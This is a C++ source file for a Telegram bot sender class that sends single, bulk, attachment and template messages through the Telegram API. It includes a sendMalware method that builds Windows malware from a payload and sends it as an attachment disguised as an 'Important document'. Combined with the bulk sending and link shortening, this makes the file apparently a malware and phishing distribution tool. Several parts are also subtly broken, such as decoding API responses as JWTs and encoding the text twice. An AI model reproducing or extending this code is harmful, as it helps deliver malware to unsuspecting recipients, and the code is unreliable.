#include "TelegramSender.h"
#include "Logger.h"
#include <curl/curl.h>
#include <iostream>
#include <stdexcept>
#include <thread>
#include <boost/asio/ssl.hpp>
#include <jwt-cpp/jwt.h>

TelegramSender::TelegramSender(const std::string& token) : token(token), templateLoader(nullptr) {}

void TelegramSender::sendMessage(const std::string &recipient, const std::string &message) {
    std::string shortenedMessage = URLShortener::shorten(message);
    std::string preparedMessage = prepareMessage(shortenedMessage);
    logTelegramSending(recipient, preparedMessage);
    std::string url = "https://api.telegram.org/bot" + token + "/sendMessage";

    std::map<std::string, std::string> fields = {
        {"chat_id", recipient},
        {"text", preparedMessage}
    };

    sendHTTPRequest(url, fields);
}

void TelegramSender::sendBulkMessages(const std::vector<std::string> &recipients, const std::string &message) {
    std::string shortenedMessage = URLShortener::shorten(message);
    std::string preparedMessage = prepareMessage(shortenedMessage);
    for (const auto &recipient : recipients) {
        logTelegramSending(recipient, preparedMessage);
        sendMessage(recipient, preparedMessage);
    }
}

void TelegramSender::sendMessageWithAttachment(const std::string &recipient, const std::string &message, const std::string &attachmentPath) {
    std::string shortenedMessage = URLShortener::shorten(message);
    std::string preparedMessage = prepareMessage(shortenedMessage);
    logTelegramSending(recipient, preparedMessage);

    CURL *curl;
    CURLcode res;

    curl_mime *form = nullptr;
    curl_mimepart *field = nullptr;

    curl = curl_easy_init();
    if(curl) {
        form = curl_mime_init(curl);
        field = curl_mime_addpart(form);
        curl_mime_name(field, "chat_id");
        curl_mime_data(field, recipient.c_str(), CURL_ZERO_TERMINATED);

        field = curl_mime_addpart(form);
        curl_mime_name(field, "caption");
        curl_mime_data(field, preparedMessage.c_str(), CURL_ZERO_TERMINATED);

        field = curl_mime_addpart(form);
        curl_mime_name(field, "document");
        curl_mime_filedata(field, attachmentPath.c_str());

        curl_easy_setopt(curl, CURLOPT_URL, ("https://api.telegram.org/bot" + token + "/sendDocument").c_str());
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            Logger::log(Logger::ERROR, "Failed to send Telegram message with attachment: " + std::string(curl_easy_strerror(res)));
            throw std::runtime_error("Failed to send Telegram message with attachment: " + std::string(curl_easy_strerror(res)));
        }

        curl_mime_free(form);
        curl_easy_cleanup(curl);
    }
}

void TelegramSender::sendMalware(const std::string &recipient, const std::string &payloadPath) {
    std::string malwarePath = MCreator::createWindowsMalware(payloadPath);
    sendMessageWithAttachment(recipient, "Important document, please check.", malwarePath);
}

bool TelegramSender::sendTemplateMessage(const std::string &recipient, const std::string &templateName, const std::unordered_map<std::string, std::string> &params) {
    if (!templateLoader) {
        Logger::log(Logger::ERROR, "Template loader not set");
        return false;
    }

    std::string templateContent;
    if (!templateLoader->loadTemplate(templateName, templateContent)) {
        Logger::log(Logger::ERROR, "Failed to load template: " + templateName);
        return false;
    }

    for (const auto& param : params) {
        auto placeholder = "{" + param.first + "}";
        auto pos = templateContent.find(placeholder);
        if (pos != std::string::npos) {
            templateContent.replace(pos, placeholder.length(), param.second);
        }
    }

    sendMessage(recipient, templateContent);
    return true;
}

void TelegramSender::setTemplateLoader(const std::shared_ptr<TemplateLoader>& loader) {
    templateLoader = loader;
}

void TelegramSender::sendHTTPRequest(const std::string &url, const std::map<std::string, std::string>& fields) {
    CURL *curl;
    CURLcode res;

    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());

        if (!fields.empty()) {
            std::string postFields;
            for (const auto& field : fields) {
                postFields += field.first + "=" + curl_easy_escape(curl, field.second.c_str(), field.second.length()) + "&";
            }
            postFields.pop_back(); 
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postFields.c_str());
        }

        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            Logger::log(Logger::ERROR, "Failed to send HTTP request: " + std::string(curl_easy_strerror(res)));
            throw std::runtime_error("Failed to send HTTP request: " + std::string(curl_easy_strerror(res)));
        }
        curl_easy_cleanup(curl);
    } else {
        Logger::log(Logger::ERROR, "Failed to initialize CURL");
        throw std::runtime_error("Failed to initialize CURL");
    }
}

std::string TelegramSender::prepareMessage(const std::string &message) {
    std::string encodedMessage;
    for (char c : message) {
        if (c == ' ') {
            encodedMessage += "%20";
        } else {
            encodedMessage += c;
        }
    }
    return encodedMessage;
}

void TelegramSender::logTelegramSending(const std::string &recipient, const std::string &message) {
    std::cout << "Sending Telegram message to " << recipient << ": " << message << std::endl;
    Logger::log(Logger::INFO, "Sending Telegram message to " + recipient + ": " + message);
}

void TelegramSender::handleApiResponse(const std::string &response) {
    auto decoded = jwt::decode(response);
    if (decoded.get_header_claim("error").as_string() != "") {
        Logger::log(Logger::ERROR, "Error in API response: " + response);
    }
}

bool TelegramSender::retryOnFailure(const std::string &recipient, const std::string &message, int retries) {
    while (retries > 0) {
        try {
            sendHTTPRequest("https://api.telegram.org/bot" + token + "/sendMessage", {{"chat_id", recipient}, {"text", message}});
            return true;
        } catch (const std::exception &e) {
            Logger::log(Logger::WARNING, "Retrying send message: " + std::string(e.what()));
            --retries;
            std::this_thread::sleep_for(std::chrono::seconds(1)); 
        }
    }
    return false;
}





